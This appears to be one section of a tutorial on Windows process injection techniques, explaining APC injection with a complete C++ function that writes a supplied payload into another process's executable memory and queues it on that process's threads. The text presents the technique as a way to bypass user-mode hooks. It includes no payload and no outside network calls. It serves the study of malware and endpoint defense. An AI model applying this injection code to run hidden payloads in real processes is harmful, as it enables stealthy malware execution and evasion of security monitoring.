### 2. APC Injection (Asynchronous Procedure Call)
APC injection is often used to bypass user-mode hooks. Instead of creating a new thread, it queues a code segment (the payload) to run in the context of an existing thread in the target process. The code executes only when the thread enters an alertable state.

**APIs Used:** `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateToolhelp32Snapshot`, `Thread32First`, `OpenThread`, `QueueUserAPC`.

```cpp
bool InjectAPC(DWORD pid, BYTE* payload, SIZE_T payloadSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    // Allocate memory for payload
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return false;
    }

    // Write payload
    if (!WriteProcessMemory(hProcess, pRemoteMem, payload, payloadSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Snapshot threads to find a target
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);
    bool injected = false;

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    // Queue the APC to the thread
                    DWORD dwRet = QueueUserAPC((PAPCFUNC)pRemoteMem, hThread, 0);
                    if (dwRet) {
                        std::cout << "APC Queued to thread ID: " << te.th32ThreadID << std::endl;
                        injected = true;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te) && !injected); // Inject to first available thread
    }

    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    return injected;
}
```

